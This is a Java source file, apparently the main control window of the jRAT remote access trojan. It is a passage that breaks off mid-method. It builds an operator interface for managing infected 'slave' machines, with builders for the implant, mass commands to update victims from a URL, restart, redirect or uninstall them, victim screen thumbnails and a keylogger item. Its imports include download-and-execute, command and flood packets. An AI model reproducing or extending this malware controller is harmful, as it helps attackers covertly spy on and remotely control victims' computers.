package pro.jrat.ui.frames;

import java.awt.Color;
import java.awt.Component;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import javax.swing.ButtonGroup;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JRadioButtonMenuItem;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JToolBar;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ListSelectionModel;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;

import pro.jrat.Constants;
import pro.jrat.ErrorDialog;
import pro.jrat.Help;
import pro.jrat.Main;
import pro.jrat.SampleMode;
import pro.jrat.Slave;
import pro.jrat.UniqueId;
import pro.jrat.api.RATMenuItem;
import pro.jrat.api.RATObject;
import pro.jrat.common.Flood;
import pro.jrat.common.Version;
import pro.jrat.events.Event;
import pro.jrat.events.Events;
import pro.jrat.extensions.Plugin;
import pro.jrat.extensions.PluginLoader;
import pro.jrat.extensions.RATObjectFormat;
import pro.jrat.listeners.CountryMenuItemListener;
import pro.jrat.net.URLParser;
import pro.jrat.net.WebRequest;
import pro.jrat.packets.outgoing.Packet11Disconnect;
import pro.jrat.packets.outgoing.Packet14VisitURL;
import pro.jrat.packets.outgoing.Packet17DownloadExecute;
import pro.jrat.packets.outgoing.Packet18Update;
import pro.jrat.packets.outgoing.Packet22Flood;
import pro.jrat.packets.outgoing.Packet36Uninstall;
import pro.jrat.packets.outgoing.Packet37RestartJavaProcess;
import pro.jrat.packets.outgoing.Packet38RunCommand;
import pro.jrat.packets.outgoing.Packet40Thumbnail;
import pro.jrat.packets.outgoing.Packet45Reconnect;
import pro.jrat.settings.Settings;
import pro.jrat.ui.components.DraggableTabbedPane;
import pro.jrat.ui.panels.PanelMainLog;
import pro.jrat.ui.panels.PanelMainPlugins;
import pro.jrat.ui.panels.PanelMainSockets;
import pro.jrat.ui.panels.PanelMainStats;
import pro.jrat.ui.renderers.table.MainTableRenderer;
import pro.jrat.ui.renderers.table.PluginsTableRenderer;
import pro.jrat.utils.FlagUtils;
import pro.jrat.utils.IconUtils;
import pro.jrat.utils.NetUtils;
import pro.jrat.utils.Utils;
import javax.swing.event.ChangeListener;
import javax.swing.event.ChangeEvent;


@SuppressWarnings({ "serial" })
public class Frame extends BaseFrame {

	private JPanel contentPane;
	private JTable onConnectTable;
	public JTabbedPane tabbedPane;

	public DefaultTableModel log;

	public static JTable mainTable;
	public static DefaultTableModel mainModel;
	public static DefaultTableModel onConnectModel;
	public static String[] columnNames = { "L", "Server ID", "Status", "IP/Port", "Ping", "User@Comp", "OS name" };
	public static TrayIcon trayIcon;
	public static int pingmode = Frame.PING_ICON_DOT;
	public static boolean thumbnails = false;
	private JPopupMenu popupMenu;
	private JToolBar toolBar;
	public static final int PING_ICON_DOT = 0;
	public static final int PING_ICON_CIRC = 1;
	private final ButtonGroup encryptionButtonGroup = new ButtonGroup();
	private JMenu mnPlugins;

	public Frame() {
		super();
		setIconImage(Toolkit.getDefaultToolkit().getImage(Frame.class.getResource("/icons/icon.png")));
		setTitle(Main.formatTitle());
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 657, 409);

		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);

		JMenu mnMain = new JMenu("Main");
		menuBar.add(mnMain);

		JMenuItem mntmClientSettings = new JMenuItem("Settings");
		mntmClientSettings.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameSettings().setVisible(true);
			}
		});

		JMenuItem mntmAddSocket = new JMenuItem("Add Socket");
		mntmAddSocket.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameAddSocket frame = new FrameAddSocket();
				frame.setVisible(true);
			}
		});
		mntmAddSocket.setIcon(new ImageIcon(Frame.class.getResource("/icons/socket_add.png")));
		mnMain.add(mntmAddSocket);
		
		JMenu mnEncryption = new JMenu("Encryption");
		mnEncryption.setIcon(new ImageIcon(Frame.class.getResource("/icons/key.png")));
		mnMain.add(mnEncryption);
		
		JRadioButtonMenuItem rdbtnmntmEnable = new JRadioButtonMenuItem("Enable");
		rdbtnmntmEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave.toggleEncryption(true);
				Settings.getGlobal().setVal("encryption", true);
			}
		});
		rdbtnmntmEnable.setSelected(true);
		encryptionButtonGroup.add(rdbtnmntmEnable);
		mnEncryption.add(rdbtnmntmEnable);
		
		JRadioButtonMenuItem rdbtnmntmDisable = new JRadioButtonMenuItem("Disable");
		rdbtnmntmDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Slave.toggleEncryption(false);
				Settings.getGlobal().setVal("encryption", false);
			}
		});
		encryptionButtonGroup.add(rdbtnmntmDisable);
		mnEncryption.add(rdbtnmntmDisable);
		mnEncryption.addSeparator();
		
		JMenuItem menuItem_1 = new JMenuItem("?");
		menuItem_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Help.help("If you are experiencing problems with languages such as \nRussian, Ukrainan, Hebrew, Indian, Chinese, Arabian and others\n disable encryption to be able to view such characters");
			}
		});
		menuItem_1.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
		mnEncryption.add(menuItem_1);
		
		if (Main.trial) {
			mnMain.addSeparator();
			
			JMenuItem mntmUpgrade = new JMenuItem("Upgrade");
			mntmUpgrade.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					NetUtils.openUrl(WebRequest.domains[0] + "/upgrade.php");
				}
			});
			mntmUpgrade.setIcon(new ImageIcon(Frame.class.getResource("/icons/donate.png")));
			mnMain.add(mntmUpgrade);
		}
		mnMain.addSeparator();
		mntmClientSettings.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbox.png")));
		mnMain.add(mntmClientSettings);

		JCheckBoxMenuItem chckbxmntmShowToolbar = new JCheckBoxMenuItem("Show Toolbar");
		chckbxmntmShowToolbar.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbar.png")));
		chckbxmntmShowToolbar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				toolBar.setVisible(((JCheckBoxMenuItem) arg0.getSource()).isSelected());
			}
		});
		mnMain.add(chckbxmntmShowToolbar);

		JCheckBoxMenuItem mntmShowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
		mnMain.add(mntmShowThumbnails);
		mntmShowThumbnails.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				thumbnails = !thumbnails;

				if (thumbnails) {
					for (int i = 0; i < Main.connections.size(); i++) {
						Slave sl = Main.connections.get(i);
						if (sl.getThumbnail() == null) {
							sl.addToSendQueue(new Packet40Thumbnail());
						} else {
							int row = Utils.getRow(sl);
							mainModel.setValueAt(sl.getThumbnail(), row, 0);
						}
					}
					mainTable.setRowHeight(100);
				} else {
					mainTable.setRowHeight(30);
					for (int i = 0; i < Main.connections.size(); i++) {
						Slave sl = Main.connections.get(i);
						int row = Utils.getRow(sl);
						mainModel.setValueAt(sl.getCountry(), row, 0);
					}
				}
			}
		});
		mntmShowThumbnails.setIcon(new ImageIcon(Frame.class.getResource("/icons/image.png")));

		mnMain.addSeparator();

		JMenu mnServerModule = new JMenu("Server Module");
		mnServerModule.setIcon(new ImageIcon(Frame.class.getResource("/icons/bug.png")));
		mnMain.add(mnServerModule);
		mnMain.addSeparator();

		JMenuItem mntmBuildServer = new JMenuItem("Normal Builder");
		mntmBuildServer.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				new FrameBuildMinimal().setVisible(true);
			}
		});
		mntmBuildServer.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
		mnServerModule.add(mntmBuildServer);

		JMenuItem mntmAdvancedBuild = new JMenuItem("Advanced Builder");
		mntmAdvancedBuild.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameBuildAdvanced frame = new FrameBuildAdvanced();
				frame.setVisible(true);
			}
		});
		mntmAdvancedBuild.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
		mnServerModule.add(mntmAdvancedBuild);

		JMenuItem mntmEulamustRead = new JMenuItem("EULA (Must read)");
		mntmEulamustRead.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameEULA frame = new FrameEULA(true);
				frame.setVisible(true);
			}
		});
		mntmEulamustRead.setIcon(new ImageIcon(Frame.class.getResource("/icons/gavel.png")));
		mnMain.add(mntmEulamustRead);

		JMenuItem mntmAProblemShow = new JMenuItem("A problem? Show help");
		mntmAProblemShow.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameHelp frame = new FrameHelp();
				frame.setVisible(true);
			}
		});
		mntmAProblemShow.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
		mnMain.add(mntmAProblemShow);
		mnMain.addSeparator();

		JMenuItem mntmExit = new JMenuItem("Exit");
		mntmExit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Main.instance.setVisible(false);
				Main.instance.dispose();
				System.exit(0);
			}
		});

		JMenuItem mntmPlugins = new JMenuItem("Plugins");
		mntmPlugins.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FramePlugins frame = new FramePlugins();
				frame.setVisible(true);
			}
		});
		mntmPlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
		mnMain.add(mntmPlugins);
		
		JMenuItem mntmBrowsePlugins = new JMenuItem("Browse Plugins");
		mntmBrowsePlugins.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameOnlinePlugins frame = new FrameOnlinePlugins();
				frame.setVisible(true);
			}
		});
		mntmBrowsePlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/application_icon_large.png")));
		mnMain.add(mntmBrowsePlugins);
		mnMain.addSeparator();
		
		JMenuItem mntmGenerateKey = new JMenuItem("Generate key");
		mntmGenerateKey.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					File keyFile = new File("jrat.key");
					
					if (keyFile.exists() && JOptionPane.showConfirmDialog(null, "jrat.key already exists, do you want to overwrite and generate a new one?", "Generate key", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) != JOptionPane.YES_OPTION) {
						return;
					}
					
					FileOutputStream out = new FileOutputStream(keyFile);
					out.write(UniqueId.generateBinary());
					out.close();
					
					JOptionPane.showMessageDialog(null, "Generated a new key to jrat.key\nBackup this file and do not loose it", "Generate key", JOptionPane.INFORMATION_MESSAGE);
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		mntmGenerateKey.setIcon(new ImageIcon(Frame.class.getResource("/icons/key_plus.png")));
		mnMain.add(mntmGenerateKey);
		mntmExit.setIcon(new ImageIcon(Frame.class.getResource("/icons/exit.png")));
		mnMain.add(mntmExit);

		JMenu mnTools = new JMenu("Tools");
		menuBar.add(mnTools);

		JMenuItem mntmGarbageCollector = new JMenuItem("Garbage Collector");
		mntmGarbageCollector.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				long start = Runtime.getRuntime().freeMemory();
				System.gc();
				long end = Runtime.getRuntime().freeMemory();
				long result = end - start;
				JOptionPane.showMessageDialog(null, "Saved " + (result / 1024L) + " kb memory", "Garbage Collector", JOptionPane.INFORMATION_MESSAGE);
			}
		});

		JMenu mnLook = new JMenu("Look");
		mnLook.setIcon(new ImageIcon(Frame.class.getResource("/icons/gui.png")));
		mnTools.add(mnLook);

		mnTools.addSeparator();

		JMenu mnPingIcon = new JMenu("Ping icon");
		mnLook.add(mnPingIcon);
		mnPingIcon.setIcon(new ImageIcon(Frame.class.getResource("/icons/application_icon_large.png")));

		JMenuItem mntmMeter = new JMenuItem("Meter");
		mntmMeter.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				pingmode = Frame.PING_ICON_DOT;
				mainTable.repaint();
			}
		});
		mntmMeter.setIcon(new ImageIcon(Frame.class.getResource("/icons/ping0.png")));
		mnPingIcon.add(mntmMeter);

		JMenuItem mntmCircle = new JMenuItem("Circle");
		mntmCircle.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				pingmode = Frame.PING_ICON_CIRC;
				mainTable.repaint();
			}
		});
		mntmCircle.setIcon(new ImageIcon(Frame.class.getResource("/icons/network_green.png")));
		mnPingIcon.add(mntmCircle);

		JMenu mnTabPlacement = new JMenu("Tab placement");
		mnLook.add(mnTabPlacement);
		mnTabPlacement.setIcon(new ImageIcon(Frame.class.getResource("/icons/application-dock-tab.png")));

		JMenuItem mntmTop = new JMenuItem("Top");
		mntmTop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.TOP);
			}
		});
		mntmTop.setIcon(new ImageIcon(Frame.class.getResource("/icons/ui-tab.png")));
		mnTabPlacement.add(mntmTop);

		JMenuItem mntmBottom = new JMenuItem("Bottom");
		mntmBottom.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.BOTTOM);
			}
		});
		mntmBottom.setIcon(new ImageIcon(Frame.class.getResource("/icons/ui-tab-bottom.png")));
		mnTabPlacement.add(mntmBottom);

		JMenuItem mntmLeft = new JMenuItem("Left");
		mntmLeft.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.LEFT);
			}
		});
		mntmLeft.setIcon(new ImageIcon(Frame.class.getResource("/icons/ui-tab-side.png")));
		mnTabPlacement.add(mntmLeft);

		JMenuItem mntmRight = new JMenuItem("Right");
		mntmRight.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				tabbedPane.setTabPlacement(JTabbedPane.RIGHT);
			}
		});
		mntmRight.setIcon(new ImageIcon(Frame.class.getResource("/icons/ui-tab-side-right.png")));
		mnTabPlacement.add(mntmRight);

		JMenu mnTableResizeBehaviour = new JMenu("Table resize behaviour");
		mnLook.add(mnTableResizeBehaviour);
		mnTableResizeBehaviour.setIcon(new ImageIcon(Frame.class.getResource("/icons/application-table.png")));

		JMenuItem mntmResizeOff = new JMenuItem("Resize off");
		mntmResizeOff.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
			}
		});
		mntmResizeOff.setIcon(new ImageIcon(Frame.class.getResource("/icons/application-resize.png")));
		mnTableResizeBehaviour.add(mntmResizeOff);

		JMenuItem mntmFit = new JMenuItem("Fit");
		mntmFit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
			}
		});
		mntmFit.setIcon(new ImageIcon(Frame.class.getResource("/icons/application-resize-full.png")));
		mnTableResizeBehaviour.add(mntmFit);

		JMenuItem mntmRowHeight = new JMenuItem("Row height");
		mnLook.add(mntmRowHeight);
		mntmRowHeight.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String str = Utils.showDialog("Input", "Input new row height. Default: 30");
				if (str == null) {
					return;
				}

				int h;

				try {
					h = Integer.parseInt(str.trim());
				} catch (Exception ex) {
					return;
				}
				mainTable.setRowHeight(h);
			}
		});
		mntmRowHeight.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_dock.png")));

		JMenuItem mntmColors = new JMenuItem("Colors");
		mnLook.add(mntmColors);
		mntmColors.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameColors frame = new FrameColors();
				frame.setVisible(true);
			}
		});
		mntmColors.setIcon(new ImageIcon(Frame.class.getResource("/icons/color-swatches.png")));

		JMenuItem mntmGroups = new JMenuItem("Groups");
		mnTools.add(mntmGroups);
		mntmGroups.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameGroups frame = new FrameGroups();
				frame.setVisible(true);
			}
		});
		mntmGroups.setIcon(new ImageIcon(Frame.class.getResource("/icons/group.png")));

		JMenuItem mntmSampleMode = new JMenuItem("Sample Mode");
		mnTools.add(mntmSampleMode);
		mntmSampleMode.setIcon(new ImageIcon(Frame.class.getResource("/icons/camera.png")));
		mntmSampleMode.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (Utils.yesNo("Confirm", "This will break " + Constants.NAME + " until restarted and begin a photo friendly session")) {
					SampleMode.start();
				}
			}
		});
		mntmGarbageCollector.setIcon(new ImageIcon(Frame.class.getResource("/icons/garbage.png")));
		mnTools.add(mntmGarbageCollector);

		JMenuItem mntmPerformance = new JMenuItem("Performance");
		mntmPerformance.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FramePerformance frame = new FramePerformance();
				frame.setVisible(true);
			}
		});
		mntmPerformance.setIcon(new ImageIcon(Frame.class.getResource("/icons/meter.png")));
		mnTools.add(mntmPerformance);

		JMenu mnServers = new JMenu("Servers");
		menuBar.add(mnServers);

		JMenuItem mntmSelectAll = new JMenuItem("Select all");
		mntmSelectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
			}
		});
		mntmSelectAll.setIcon(new ImageIcon(Frame.class.getResource("/icons/select_all_.png")));
		mnServers.add(mntmSelectAll);

		JMenuItem mntmSelectX = new JMenuItem("Select X");
		mntmSelectX.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (mainModel.getRowCount() == 0) {
					return;
				}
				String howmany = Utils.showDialog("Select X", "Select how many servers you want to select\n" + mainModel.getRowCount() + " available");
				if (howmany == null || howmany != null && howmany.length() == 0) {
					return;
				}
				int many;
				try {
					many = Integer.parseInt(howmany.trim());
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Invalid amount!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				if (many > mainModel.getRowCount()) {
					JOptionPane.showMessageDialog(null, "You dont have " + many + " servers", "Error", JOptionPane.WARNING_MESSAGE);
					return;
				}
				for (int i = 0; i < Main.connections.size() && i < many; i++) {
					Main.connections.get(i).setSelected(true);
				}
				mainTable.repaint();
			}
		});
		mntmSelectX.setIcon(new ImageIcon(Frame.class.getResource("/icons/select_x.png")));
		mnServers.add(mntmSelectX);

		JMenuItem mntmUnselectAll = new JMenuItem("Unselect all");
		mntmUnselectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				unselectAll();
			}
		});
		mnServers.add(mntmUnselectAll);
		mnServers.addSeparator();

		JMenuItem mntmRestartAll = new JMenuItem("Restart all");
		mntmRestartAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<Slave> list = Utils.getSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting all servers")) {
						for (Slave sl : list) {
							try {
								sl.addToSendQueue(new Packet37RestartJavaProcess());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmRestartAll.setIcon(new ImageIcon(Frame.class.getResource("/icons/refresh.png")));
		mnServers.add(mntmRestartAll);

		JMenuItem mntmDisconnectAll = new JMenuItem("Disconnect all");
		mntmDisconnectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<Slave> list = Utils.getSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting all servers")) {
						for (Slave sl : list) {
							try {
								sl.addToSendQueue(new Packet11Disconnect());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmReconnectAll = new JMenuItem("Reconnect all");
		mntmReconnectAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				selectAll();
				List<Slave> list = Utils.getSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnecting all servers")) {
						for (Slave sl : list) {
							try {
								sl.addToSendQueue(new Packet45Reconnect());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmReconnectAll.setIcon(new ImageIcon(Frame.class.getResource("/icons/refresh_blue.png")));
		mnServers.add(mntmReconnectAll);
		mntmDisconnectAll.setIcon(new ImageIcon(Frame.class.getResource("/icons/delete.png")));
		mnServers.add(mntmDisconnectAll);

		JMenuItem mntmUninstallAll = new JMenuItem("Uninstall all");
		mntmUninstallAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				selectAll();
				List<Slave> list = Utils.getSlaves();
				if (list.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling all servers")) {
						for (Slave sl : list) {
							try {
								sl.addToSendQueue(new Packet36Uninstall());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmUninstallAll.setIcon(new ImageIcon(Frame.class.getResource("/icons/exit.png")));
		mnServers.add(mntmUninstallAll);
		mnServers.addSeparator();

		JMenuItem mntmUpdateAllOutdated = new JMenuItem("Update all outdated (red)");
		mntmUpdateAllOutdated.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (mainModel.getRowCount() <= 0) {
					return;
				}
				String result = Utils.showDialog("Update from URL", "Input URL to update with");
				if (result == null) {
					return;
				}
				if (!result.startsWith("http://")) {
					JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
					return;
				}

				result = result.trim().replace(" ", "%20");

				int servers = 0;
				for (int i = 0; i < mainModel.getRowCount(); i++) {
					Slave sl = Utils.getSlave(mainModel.getValueAt(i, 3).toString());
					if (sl != null) {
						if (!sl.getVersion().equals(Version.getVersion())) {
							sl.addToSendQueue(new Packet18Update(result));
							++servers;
						}
					}
				}
				JOptionPane.showMessageDialog(null, "Updated on " + servers + " outdated servers");
			}
		});

		JMenuItem mntmRedirectAllTemporary = new JMenuItem("Redirect all temporary");
		mntmRedirectAllTemporary.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameRedirect frame = new FrameRedirect(null);
				frame.setVisible(true);
			}
		});
		mntmRedirectAllTemporary.setIcon(new ImageIcon(Frame.class.getResource("/icons/redirect.png")));
		mnServers.add(mntmRedirectAllTemporary);
		mntmUpdateAllOutdated.setIcon(new ImageIcon(Frame.class.getResource("/icons/update.png")));
		mnServers.add(mntmUpdateAllOutdated);
		
		mnPlugins = new JMenu("Plugins");
		menuBar.add(mnPlugins);
		
		JMenu mnOther = new JMenu("Other");
		menuBar.add(mnOther);

		JMenuItem mntmCache = new JMenuItem("Clear cache + thumbs");
		mntmCache.setIcon(new ImageIcon(Frame.class.getResource("/icons/clear.png")));
		mntmCache.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FlagUtils.flags.clear();
				Utils.pingicons.clear();
				for (int i = 0; i < Main.connections.size(); i++) {
					Slave sl = Main.connections.get(i);
					sl.setThumbnail(null);
				}
				System.gc();
			}
		});
		mnOther.add(mntmCache);

		JMenuItem mntmReloadAllThumbnails = new JMenuItem("Reload all thumbnails");
		mntmReloadAllThumbnails.setIcon(new ImageIcon(Frame.class.getResource("/icons/image.png")));
		mntmReloadAllThumbnails.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				for (int i = 0; i < Main.connections.size(); i++) {
					Slave sl = Main.connections.get(i);
					sl.addToSendQueue(new Packet40Thumbnail());
				}
			}
		});
		mnOther.add(mntmReloadAllThumbnails);

		JMenu mnAbout = new JMenu("Help");
		mnAbout.setVisible(true);
		menuBar.add(mnAbout);

		JMenuItem menuItem = new JMenuItem("About " + Constants.NAME + " " + Version.getVersion());
		menuItem.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameAbout frame = new FrameAbout();
				frame.setVisible(true);
			}
		});

		JMenuItem mntmWhatsNewIn = new JMenuItem("Whats new in " + Version.getVersion());
		mntmWhatsNewIn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameChangelog frame = new FrameChangelog(Constants.CHANGELOG_URL, Version.getVersion());
				frame.setVisible(true);
			}
		});
		mntmWhatsNewIn.setIcon(new ImageIcon(Frame.class.getResource("/icons/question.png")));
		mnAbout.add(mntmWhatsNewIn);

		JMenuItem mntmDonate = new JMenuItem("Donate");
		mntmDonate.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					java.awt.Desktop.getDesktop().browse(new URI("http://redpois0n.com/donate.php"));
				} catch (Exception ex) {
				}
			}
		});
		mntmDonate.setIcon(new ImageIcon(Frame.class.getResource("/icons/donate.png")));
		mnAbout.add(mntmDonate);

		JMenuItem mntmDebugerrorReportInfo = new JMenuItem("Debug/Error Report Info");
		mntmDebugerrorReportInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameDebugInfo debug = new FrameDebugInfo();
				debug.setVisible(true);
			}
		});
		mntmDebugerrorReportInfo.setIcon(new ImageIcon(Frame.class.getResource("/icons/javascript.png")));
		mnAbout.add(mntmDebugerrorReportInfo);
		mnAbout.addSeparator();
		menuItem.setIcon(new ImageIcon(Frame.class.getResource("/icons/info.png")));
		mnAbout.add(menuItem);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		final PanelMainStats panelStats = new PanelMainStats();

		tabbedPane = new DraggableTabbedPane(JTabbedPane.TOP);
		tabbedPane.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {					
				panelStats.setActive(tabbedPane.getSelectedIndex() == 1);	
			}
		});
		

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		tabbedPane.addTab("Main", IconUtils.getIcon("tab_main", true), scrollPane, null);

		popupMenu = new JPopupMenu();
		popupMenu.addPopupMenuListener(new PopupMenuListener() {
			public void popupMenuCanceled(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {
				try {
					for (int i = 0; i < popupMenu.getComponents().length; i++) {
						Component child = popupMenu.getComponents()[i];
						if (child instanceof JMenuItem) {
							JMenuItem item = (JMenuItem) child;
							if (item.getText().startsWith("Server V: ")) {
								popupMenu.remove(child);
								popupMenu.remove(i - 1);
								popupMenu.remove(i - 2);
							} else if (item.getText().startsWith("Keylogger") || item.getText().equals("Offline logs")) {
								item.setEnabled(true);
								if (item.getText().startsWith("Keylogger")) {
									item.setText("Keylogger");
								}
							}
						}
					}
				} catch (Exception ex) {

				}
			}

			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				try {
					List<Slave> list = Utils.getSlaves();
					if (list.size() == 1) {
						JMenuItem item = new JMenuItem("Server V: " + list.get(0).getVersion());
						JMenuItem item2 = new JMenuItem("Country: " + list.get(0).getCountry().toUpperCase());

						item2.addActionListener(new CountryMenuItemListener());

						item2.setIcon(list.get(0).getFlag());
						item.setForeground(list.get(0).isUpToDate() ? Color.black : Color.red);
						item.setIcon(list.get(0).isUpToDate() ? IconUtils.getIcon("enabled") : IconUtils.getIcon("warning"));

						popupMenu.addSeparator();
						popupMenu.add(item2);
						popupMenu.add(item);
					}
					for (int i = 0; i < popupMenu.getComponents().length; i++) {
						Component child = popupMenu.getComponents()[i];
						if (child instanceof JMenuItem) {
							JMenuItem item = (JMenuItem) child;
							if (item.getText().equals("Flag/Unflag")) {
								item.setIcon(FlagUtils.getRandomFlag());
							}
						}
					}
					mainTable.repaint();
				} catch (Exception ex) {
					// ex.printStackTrace();
				}
			}
		});
		addPopup(scrollPane, popupMenu);

		JMenuItem mntmControlPanel = new JMenuItem("Control Panel");
		mntmControlPanel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameControlPanel screen = new FrameControlPanel(slave);
					screen.setVisible(true);
				}
			}
		});
		mntmControlPanel.setIcon(new ImageIcon(Frame.class.getResource("/icons/controlpanel.png")));

		popupMenu.add(mntmControlPanel);
		popupMenu.addSeparator();

		mainTable = new JTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0 && thumbnails) {
					return ImageIcon.class;
				}
				return super.getColumnClass(column);
			}

			@Override
			public void setValueAt(Object obj, int row, int column) {
				super.setValueAt(obj, row, column);
			}
		};

		// table.setGridColor(new Color(200, 200, 200));

		mainTable.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e) {
